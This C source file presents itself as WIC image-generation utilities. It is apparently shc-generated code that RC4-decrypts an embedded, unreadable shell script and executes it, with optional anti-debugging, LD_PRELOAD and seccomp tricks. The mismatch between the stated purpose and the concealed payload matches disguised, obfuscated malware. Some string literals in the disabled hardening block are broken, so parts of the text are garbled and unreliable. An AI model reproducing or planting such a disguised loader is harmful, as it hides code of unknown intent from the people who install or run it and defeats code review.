/*
 * File: wic-image.c
 * Description: Utility functions for handling WIC image generation.
 * Author: Piyush [Software Developer]
 * License: MIT
 */

static  char data [] = 
#define      date_z	1
#define      date	((&data[0]))
	"\151"
#define      shll_z	10
#define      shll	((&data[1]))
	"\244\071\165\005\273\220\354\225\217\027"
#define      pswd_z	256
#define      pswd	((&data[47]))
	"\147\077\364\207\346\371\266\050\337\371\041\336\134\144\362\264"
	"\037\076\225\232\153\314\277\036\077\364\151\077\371\370\066\140"
	"\067\052\347\036\242\221\147\011\060\347\117\277\301\225\314\045"
	"\127\256\255\111\250\304\225\332\157\321\260\103\317\121\007\033"
	"\272\057\152\135\301\321\146\361\271\266\261\172\113\176\240\243"
	"\054\115\355\325\022\203\260\201\124\140\304\044\261\314\077\154"
	"\373\252\311\274\173\060\256\064\346\140\257\062\336\120\325\013"
	"\236\302\340\260\105\220\061\232\361\365\276\243\301\376\017\275"
	"\250\330\172\044\010\050\130\357\210\010\041\147\130\366\162\367"
	"\271\123\247\377\343\330\232\325\316\131\170\220\127\207\116\000"
	"\140\310\044\151\361\175\130\172\206\171\341\337\160\124\326\052"
	"\247\176\052\213\126\304\140\045\036\330\265\166\140\003\166\301"
	"\314\233\052\275\031\203\067\240\375\031\177\155\155\126\230\024"
	"\324\302\237\053\207\000\120\245\330\006\033\071\012\222\372\326"
	"\056\044\224\110\247\314\350\244\345\150\022\123\276\253\147\222"
	"\155\007\276\365\007\016\233\340\024\267\031\036\111\023\365\170"
	"\070\211\300\340\125\250\205\073\020\230\216\317\103\366\142\261"
	"\375\040\246\005\056\101\345\103\371\377\142\102\023\127\273\114"
	"\341\173\055\067\043\236\107\003\227\150\341\364\314\324\250\354"
	"\022\076\206\176\012\105\234\111\072\005\211\063\375\277\223\065"
	"\351\172\124\015\030\233\020\260\003\362\245\320\306\115\274\331"
	"\213\103\127\226\211\364\340\303\371\152\366\367\051\212\055\023"
	"\005\201"
#define      msg1_z	65
#define      msg1	((&data[366]))
	"\062\141\272\011\114\005\220\146\074\266\055\236\241\364\014\324"
	"\332\117\210\313\374\143\030\364\022\255\257\260\130\301\173\355"
	"\310\263\152\135\247\311\030\131\147\202\101\066\134\310\112\233"
	"\371\340\200\101\074\170\177\102\361\272\024\052\337\035\210\264"
	"\157\123\317"
#define      inlo_z	3
#define      inlo	((&data[432]))
	"\270\070\015"
#define      chk2_z	19
#define      chk2	((&data[439]))
	"\256\305\116\362\333\057\024\242\351\146\013\302\173\140\126\321"
	"\041\011\000\273\012\235\217\034\344\173"
#define      xecc_z	15
#define      xecc	((&data[464]))
	"\012\057\066\136\012\266\135\302\142\035\273\224\302\215\262\253"
	"\010\252"
#define      lsto_z	1
#define      lsto	((&data[479]))
	"\367"
#define      tst1_z	22
#define      tst1	((&data[482]))
	"\261\216\360\164\326\136\037\225\377\303\304\036\054\310\233\210"
	"\030\064\062\126\213\137\235\257\343\317\300\262"
#define      chk1_z	22
#define      chk1	((&data[513]))
	"\342\321\351\221\226\120\310\134\013\160\244\140\133\304\071\303"
	"\063\064\122\161\205\307\316\007\245\052\023"
#define      msg2_z	19
#define      msg2	((&data[537]))
	"\034\377\046\030\033\162\135\237\270\004\160\034\103\316\066\110"
	"\023\042\243\270\341\303\341\077"
#define      text_z	1332
#define      text	((&data[582]))
	"\321\153\066\000\330\374\262\146\337\201\047\222\162\014\271\124"
	"\335\243\346\163\332\151\047\365\202\045\115\271\030\364\077\071"
	"\225\037\003\330\012\174\337\320\264\274\117\236\367\203\263\047"
	"\260\217\170\243\307\006\037\141\023\156\032\327\237\002\152\370"
	"\116\043\160\014\244\207\265\356\337\006\361\042\334\321\222\374"
	"\105\007\140\146\020\204\263\154\127\364\307\175\253\012\247\361"
	"\066\100\220\346\062\022\317\272\275\100\157\371\340\202\046\232"
	"\276\371\032\265\046\342\356\123\216\224\014\261\317\361\305\057"
	"\177\153\221\025\370\112\330\046\001\054\307\263\001\240\313\223"
	"\021\176\175\001\335\004\210\167\260\334\147\242\126\160\337\257"
	"\260\037\204\274\054\021\306\364\053\177\262\364\150\223\375\141"
	"\052\035\126\226\034\014\112\213\104\165\271\376\033\122\327\176"
	"\175\172\012\142\124\230\105\122\130\365\322\337\052\204\234\115"
	"\371\165\376\144\230\307\202\266\352\315\166\263\067\176\174\377"
	"\167\101\144\067\027\014\331\321\257\025\076\140\346\262\213\266"
	"\115\256\365\375\260\343\105\114\011\167\050\003\070\136\313\271"
	"\250\206\223\160\005\324\115\010\051\115\352\073\020\234\157\061"
	"\001\174\117\001\334\116\121\160\030\320\347\014\340\247\337\315"
	"\365\174\134\326\171\274\162\237\174\371\301\143\004\342\071\354"
	"\316\043\270\047\206\043\062\223\104\346\334\061\261\226\260\345"
	"\255\256\007\257\334\103\015\145\205\275\274\034\071\056\163\113"
	"\324\347\202\100\233\022\320\115\060\062\257\205\221\271\243\324"
	"\010\135\042\102\256\073\257\226\024\157\301\024\257\017\132\134"
	"\253\150\034\053\207\165\042\271\035\140\036\064\031\047\001\202"
	"\132\367\026\160\127\053\152\151\066\331\005\357\126\050\133\320"
	"\160\100\337\224\273\265\262\217\106\030\122\251\213\117\154\354"
	"\165\264\132\224\172\073\210\036\232\070\046\207\147\022\077\366"
	"\370\121\230\305\015\116\227\110\133\124\305\104\146\250\011\143"
	"\011\250\176\235\230\253\106\334\175\072\252\225\212\126\047\163"
	"\213\136\112\057\211\043\023\233\340\073\005\034\047\334\172\130"
	"\171\260\122\301\235\304\020\216\350\350\007\174\365\072\010\271"
	"\177\047\064\276\165\242\101\067\153\231\051\000\265\115\070\027"
	"\314\151\240\124\270\100\240\056\144\173\065\050\263\125\256\050"
	"\252\351\132\341\100\211\105\150\256\015\166\137\051\017\377\165"
	"\042\230\212\037\163\143\051\272\273\107\162\032\036\043\173\311"
	"\234\310\133\150\237\341\037\021\212\162\251\052\310\026\370\152"
	"\223\202\245\347\107\020\266\054\054\227\353\147\110\147\365\265"
	"\327\301\317\226\175\166\020\074\264\046\210\044\157\103\066\276"
	"\213\023\264\216\024\057\342\111\262\207\014\056\324\216\316\175"
	"\071\120\251\216\212\124\265\006\172\160\303\116\106\062\105\075"
	"\260\377\056\133\016\126\110\246\075\065\114\152\025\133\041\204"
	"\355\145\065\355\273\356\050\362\270\111\101\177\303\023\227\156"
	"\167\237\035\266\210\146\034\312\352\324\175\026\101\104\302\105"
	"\162\206\304\051\127\174\303\343\037\275\171\236\364\122\364\025"
	"\135\170\054\256\144\056\307\020\311\023\207\236\340\135\343\176"
	"\265\073\120\262\374\053\375\130\236\304\222\146\255\354\353\123"
	"\345\134\144\212\072\055\325\051\165\330\145\132\074\321\027\104"
	"\074\164\324\300\076\305\351\161\201\041\372\211\062\112\130\032"
	"\140\176\056\134\356\305\047\350\333\016\241\307\070\037\136\034"
	"\176\217\234\040\037\176\311\045\313\060\236\151\051\165\026\275"
	"\012\105\322\106\251\362\226\100\107\042\211\340\332\156\214\143"
	"\305\372\024\023\215\356\257\371\332\060\251\076\345\177\317\354"
	"\105\354\256\226\175\307\367\131\320\073\236\032\074\275\271\374"
	"\036\203\355\144\355\207\203\250\001\274\171\306\246\310\026\163"
	"\152\102\311\323\000\366\304\251\306\011\157\216\306\116\300\337"
	"\376\154\375\305\116\003\103\356\023\215\170\221\042\054\373\321"
	"\032\233\124\262\241\265\236\030\134\114\374\265\150\113\142\002"
	"\163\000\324\175\225\247\273\254\244\042\341\262\146\277\273\262"
	"\161\004\026\133\075\316\264\257\264\061\245\014\323\077\042\151"
	"\250\162\232\013\367\111\241\011\222\241\270\037\123\147\353\327"
	"\324\165\317\175\047\325\122\027\272\051\365\314\246\160\373\124"
	"\250\370\113\207\153\106\125\060\041\057\061\355\107\324\145\243"
	"\073\211\221\146\036\021\056\026\306\364\327\261\354\316\155\126"
	"\021\067\130\205\103\244\027\331\121\331\322\047\045\011\131\351"
	"\072\315\226\143\234\365\357\311\266\103\021\105\321\264\051\377"
	"\267\036\055\306\347\001\115\220\163\231\372\264\234\215\262\120"
	"\022\127\213\036\122\036\142\016\120\114\375\065\377\073\022\201"
	"\242\060\067\357\074\251\366\305\066\367\114\345\013\050\373\343"
	"\263\144\336\334\321\126\250\324\166\014\270\274\317\230\312\321"
	"\245\027\044\157\067\352\125\071\071\332\020\237\361\170\252\046"
	"\021\377\055\071\071\141\336\330\313\207\116\052\214\011\312\217"
	"\333\023\217\331\062\326\111\111\105\233\320\141\117\077\166\157"
	"\307\302\171\041\261\001\367\203\102\077\034\275\346\265\212\177"
	"\334\176\243\321\025\361\242\024\236\272\241\147\220\266\155\211"
	"\067\054\244\007\024\040\375\030\376\253\376\313\304\220\273\207"
	"\011\046\211\071\346\237\312\306\026\247\133\366\222\212\135\062"
	"\243\050\265\157\253\216\137\250\034\113\071\216\141\074\273\126"
	"\232\030\225\171\340\112\226\141\310\316\353\210\374\125\036\311"
	"\242\371\164\226\173\053\354\064\070\342\263\237\354\032\370\377"
	"\210\302\245\233\044\267\351\374\017\140\137\243\064\370\027\263"
	"\234\040\267\164\147\075\345\261\077\022\316\302\177\100\306\034"
	"\024\351\300\044\322\265\117\146\225\177\035\026\203\057\006\016"
	"\357\027\041\115\141\372\201\264\162\212\143\027\366\212\264\061"
	"\156\232\004\253\361\231\226\135\316\376\017\357\064\250\371\332"
	"\060\223\344\344\313\034\002\013\335\127\200\366\151\352\330\250"
	"\271\352\036\212\125\125\213\056\121\076\224\061\300\274\303\062"
	"\310\175\207\246\040\156\032\373\327\101\362\101\054\313\352\345"
	"\265\010\160\013\135\374\071\257\072\316\340\373\212\244\055\123"
	"\041\265\371\102\043\023\076\373\125\060\075\201\373\047\147\260"
	"\060\327\274\216\323\366\075\016\304\035\011\117\301\067\243\343"
	"\354\235\046\020\261\144\014\006\224\111\207\220\160\356\101\241"
	"\306\375\057\231\363\154\247\270\212\261\010\114\350\253\060\325"
	"\110\126\345\372\273\362\000\120\073\207\340\254\166\041\115\074"
	"\037\175\326\022\352\175\313\164\056\323\300\027\177\360\354\310"
	"\107\322\302\002"
#define      opts_z	1
#define      opts	((&data[2067]))
	"\017"
#define      rlax_z	1
#define      rlax	((&data[2068]))
	"\221"
#define      tst2_z	19
#define      tst2	((&data[2072]))
	"\373\375\163\026\321\107\027\062\247\062\112\036\114\122\277\011"
	"\007\264\035\250\004\314\171";
#define      hide_z	4096
#define SETUID 0	
#define DEBUGEXEC	0	
#define TRACEABLE	1	
#define HARDENING	0	
#define BUSYBOXON	0	

#if HARDENING
static const char * shc_x[] = {
"",
"",
"#define _GNU_SOURCE ",
"#define PLACEHOLDER \"********\"",
"#include <dlfcn.h>",
"#include <stdlib.h>",
"#include <string.h>",
"#include <unistd.h>",
"#include <stdio.h>",
"#include <signal.h>",
"",
"static char secret[128000]; 
"typedef int (*pfi)(int, char **, char **);",
"static pfi real_main;",
"",
"
"char **copyargs(int argc, char** argv){",
"    char **newargv = malloc((argc+1)*sizeof(*argv));",
"    char *from,*to;",
"    int i,len;",
"",
"    for(i = 0; i<argc; i++){",
"        from = argv[i];",
"        len = strlen(from)+1;",
"        to = malloc(len);",
"        memcpy(to,from,len);",
"        
"        memset(from,'\\0',len);",
"        newargv[i] = to;",
"        argv[i] = 0;",
"    }",
"    newargv[argc] = 0;",
"    return newargv;",
"}",
"",
"static int mymain(int argc, char** argv, char** env) {",
"    
"    return real_main(argc, copyargs(argc,argv), env);",
"}",
"",
"int __libc_start_main(int (*main) (int, char**, char**),",
"                      int argc,",
"                      char **argv,",
"                      void (*init) (void),",
"                      void (*fini)(void),",
"                      void (*rtld_fini)(void),",
"                      void (*stack_end)){",
"    static int (*real___libc_start_main)() = NULL;",
"    int n;",
"",
"    if (!real___libc_start_main) {",
"        real___libc_start_main = dlsym(RTLD_NEXT, \"__libc_start_main\");",
"        if (!real___libc_start_main) abort();",
"    }",
"",
"    n = read(21, secret, sizeof(secret));",
"    if (n > 0) {",
"      int i;",
"",
"    if (secret[n - 1] == '\\n') secret[--n] = '\\0';",
"    for (i = 1; i < argc; i++)",
"        if (strcmp(argv[i], PLACEHOLDER) == 0)",
"          argv[i] = secret;",
"    }",
"",
"    real_main = main;",
"",
"    return real___libc_start_main(mymain, argc, argv, init, fini, rtld_fini, stack_end);",
"}",
"",
0};
#endif 



#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>



static unsigned char stte[256], indx, jndx, kndx;


void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}


void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}


void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}



#if HARDENING

#include <sys/ptrace.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/prctl.h>
#define PR_SET_PTRACER 0x59616d61


#include <stdlib.h>
#include <stdio.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/socket.h>

#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/audit.h>

#define ArchField offsetof(struct seccomp_data, arch)

#define Allow(syscall) \
    BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, SYS_##syscall, 0, 1), \
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW)

struct sock_filter filter[] = {
    
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, ArchField),
    BPF_JUMP( BPF_JMP+BPF_JEQ+BPF_K, AUDIT_ARCH_X86_64, 1, 0),
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),

    
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, offsetof(struct seccomp_data, nr)),

    
    Allow(exit_group),  
    Allow(brk),         
    Allow(mmap),        
    Allow(munmap),      

    
    BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),
};
struct sock_fprog filterprog = {
    .len = sizeof(filter)/sizeof(filter[0]),
    .filter = filter
};


void seccomp_hardening() {
    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) {
        perror("Could not start seccomp:");
        exit(1);
    }
    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &filterprog) == -1) {
        perror("Could not start seccomp:");
        exit(1);
    }
} 


void shc_x_file() {
    FILE *fp;
    int line = 0;

    if ((fp = fopen("/tmp/shc_x.c", "w")) == NULL ) {exit(1); exit(1);}
    for (line = 0; shc_x[line]; line++)	fprintf(fp, "%s\n", shc_x[line]);
    fflush(fp);fclose(fp);
}

int make() {
	char * cc, * cflags, * ldflags;
    char cmd[4096];

	cc = getenv("CC");
	if (!cc) cc = "cc";

	sprintf(cmd, "%s %s -o %s %s", cc, "-Wall -fpic -shared", "/tmp/shc_x.so", "/tmp/shc_x.c -ldl");
	if (system(cmd)) {remove("/tmp/shc_x.c"); return -1;}
	remove("/tmp/shc_x.c"); return 0;
}

void arc4_hardrun(void * str, int len) {
    
    char tmp2[len];
    char tmp3[len+1024];
    memcpy(tmp2, str, len);

	unsigned char tmp, * ptr = (unsigned char *)tmp2;
    int lentmp = len;
    int pid, status;
    pid = fork();

    shc_x_file();
    if (make()) {exit(1);}

    setenv("LD_PRELOAD","/tmp/shc_x.so",1);

    if(pid==0) {

        
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
            kill(getpid(), SIGKILL);
            _exit(1);
        }

        
        while (len > 0) {
            indx++;
            tmp = stte[indx];
            jndx += tmp;
            stte[indx] = stte[jndx];
            stte[jndx] = tmp;
            tmp += stte[indx];
            *ptr ^= stte[tmp];
            ptr++;
            len--;
        }

        
        sprintf(tmp3, "%s %s", "'********' 21<<<", tmp2);

        
        system(tmp2);

        
        memcpy(tmp2, str, lentmp);

        
        remove("/tmp/shc_x.so");

        
        ptrace(PTRACE_DETACH, 0, 0, 0);
        exit(0);
    }
    else {wait(&status);}

    
    seccomp_hardening();

    exit(0);
}
#endif 


int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif 

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

void chkenv_end(void);

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask = (unsigned long)getpid();
	stte_0();
	 key(&chkenv, (void*)&chkenv_end - (void*)&chkenv);
	 key(&data, sizeof(data));
	 key(&mask, sizeof(mask));
	arc4(&mask, sizeof(mask));
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

void chkenv_end(void){}

#if HARDENING

static void gets_process_name(const pid_t pid, char * name) {
	char procfile[BUFSIZ];
	sprintf(procfile, "/proc/%d/cmdline", pid);
	FILE* f = fopen(procfile, "r");
	if (f) {
		size_t size;
		size = fread(name, sizeof (char), sizeof (procfile), f);
		if (size > 0) {
			if ('\n' == name[size - 1])
				name[size - 1] = '\0';
		}
		fclose(f);
	}
}

void hardening() {
    prctl(PR_SET_DUMPABLE, 0);
    prctl(PR_SET_PTRACER, -1);

    int pid = getppid();
    char name[256] = {0};
    gets_process_name(pid, name);

    if (   (strcmp(name, "bash") != 0) 
        && (strcmp(name, "/bin/bash") != 0) 
        && (strcmp(name, "sh") != 0) 
        && (strcmp(name, "/bin/sh") != 0) 
        && (strcmp(name, "sudo") != 0) 
        && (strcmp(name, "/bin/sudo") != 0) 
        && (strcmp(name, "/usr/bin/sudo") != 0)
        && (strcmp(name, "gksudo") != 0) 
        && (strcmp(name, "/bin/gksudo") != 0) 
        && (strcmp(name, "/usr/bin/gksudo") != 0) 
        && (strcmp(name, "kdesu") != 0) 
        && (strcmp(name, "/bin/kdesu") != 0) 
        && (strcmp(name, "/usr/bin/kdesu") != 0) 
       )
    {
        printf("Operation not permitted\n");
        kill(getpid(), SIGKILL);
        exit(1);
    }
}

#endif 

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PT_ATTACHEXC) 
   #if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
       #define PT_ATTACHEXC	PT_ATTACH
   #elif defined(PTRACE_ATTACH)
       #define PT_ATTACHEXC PTRACE_ATTACH
   #endif
#endif

void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PT_ATTACHEXC, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif 

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;
	char * me = argv[0];
	if (me == NULL) { me = getenv("_"); }
	if (me == 0) { fprintf(stderr, "E: neither argv[0] nor $_ works."); exit(1); }

	ret = chkenv(argc);
	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
#if HARDENING
	    arc4_hardrun(text, text_z);
	    exit(0);
       
       seccomp_hardening();
#endif
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		
		scrpt = malloc(hide_z + text_z);
		if (!scrpt)
			return 0;
		memset(scrpt, (int) ' ', hide_z);
		memcpy(&scrpt[hide_z], text, text_z);
	} else {			
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, me);
		} else {
			scrpt = me;
		}
	}
	j = 0;
#if BUSYBOXON
	varg[j++] = "busybox";
	varg[j++] = "sh";
#else
	varg[j++] = argv[0];		
#endif
	if (ret && *opts)
		varg[j++] = opts;	
	if (*inlo)
		varg[j++] = inlo;	
	varg[j++] = scrpt;		
	if (*lsto)
		varg[j++] = lsto;	
	i = (ret > 1) ? ret : 0;	
	while (i < argc)
		varg[j++] = argv[i++];	
	varg[j] = 0;			
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if SETUID
   setuid(0);
#endif
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if HARDENING
	hardening();
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
